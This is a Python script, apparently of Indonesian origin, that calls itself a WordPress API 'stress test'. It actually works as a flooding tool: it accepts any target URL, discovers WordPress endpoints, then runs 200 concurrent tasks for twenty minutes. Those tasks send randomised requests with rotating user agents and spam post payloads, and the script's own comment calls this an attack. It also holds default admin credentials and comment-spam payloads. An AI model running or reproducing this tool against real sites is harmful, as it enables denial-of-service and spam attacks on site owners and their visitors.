import asyncio
import aiohttp
import random
import time
import logging
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
import requests
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger("WordPressAPITester")

class WordPressAPITesterAsync:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        ]
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
        }
        self.endpoints = [
            "wp-json/wp/v2/posts", 
            "wp-json/wp/v2/users",
            "wp-json/wp/v2/comments",
            "wp-json",
            "wp-admin",
            "wp-login.php",
            "xmlrpc.php",
            "wp-includes",
            "wp-content",
            "wp-json/wp/v2/pages",
            "wp-json/wp/v2/categories",
            "wp-json/wp/v2/tags",
            "wp-json/wp/v2/media",
            "wp-cron.php",
            "wp-links-opml.php"
        ]
        self.payloads = {
            "auth_test": {"username": "admin", "password": "admin123"},
            "post_test": {"title": "Spam", "content": "Spam Content", "status": "publish"},
            "comment_spam": {"author_name": "Bot", "author_email": "bot@example.com", "content": "Spam Comment"},
            "search_test": {"s": "test_search"}
        }

    def get_random_user_agent(self):
        return random.choice(self.user_agents)

    async def send_request_async(self, session, method, url, endpoint, data=None):
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()
        try:
            async with session.request(method, full_url, json=data, headers=self.headers, ssl=False) as response:
                status = response.status
                if status in [404, 403]:
                    return None
                logger.info(f"[{status}] {method} {full_url}")
                return await response.text() if response.ok else None
        except Exception as e:
            logger.error(f"[ERROR] {method} {full_url}: {e}")
            return None

    async def attack_async(self, url, endpoints, duration):
        async with aiohttp.ClientSession() as session:
            start_time = time.time()
            while time.time() - start_time < duration:
                endpoint = random.choice(endpoints)
                method = random.choice(["GET", "POST"])
                payload = self.payloads.get("post_test") if method == "POST" else None
                result = await self.send_request_async(session, method, url, endpoint, data=payload)
                delay = random.uniform(0.05, 0.2) if result else random.uniform(0.3, 0.6)
                await asyncio.sleep(delay)

    def discover_valid_endpoints(self, url):
        valid_endpoints = []
        for endpoint in self.endpoints:
            full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
            try:
                response = requests.head(
                    full_url,
                    headers={"User-Agent": self.get_random_user_agent()},
                    timeout=10,  # Tingkatkan timeout menjadi 10 detik
                    verify=False,
                    allow_redirects=True
                )
                if 200 <= response.status_code < 404:
                    logger.info(f"[SUCCESS] Found valid endpoint: {endpoint}")
                    valid_endpoints.append(endpoint)
            except Exception as e:
                logger.error(f"Failed to verify endpoint {endpoint}: {e}")
        return valid_endpoints or self.endpoints

    async def flood_async(self, url, workers=100, duration=3600):
        logger.info(f"[INFO] Starting async stress test on {url} for {duration}s with {workers} tasks")
        valid_endpoints = self.discover_valid_endpoints(url)
        if not valid_endpoints:
            logger.error("[ERROR] No valid endpoints found. Aborting test.")
            return
        
        self.endpoints = valid_endpoints
        tasks = [self.attack_async(url, self.endpoints, duration) for _ in range(workers)]
        await asyncio.gather(*tasks)

async def main():
    target_url = input("Masukkan Target URL WordPress (e.g., https://example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        logger.error("[ERROR] URL tidak valid. Harap sertakan http:// atau https://")
        return
    
    tester = WordPressAPITesterAsync()
    await tester.flood_async(target_url, workers=200, duration=1200)  # Serangan selama 20 menit

if __name__ == "__main__":
    asyncio.run(main())
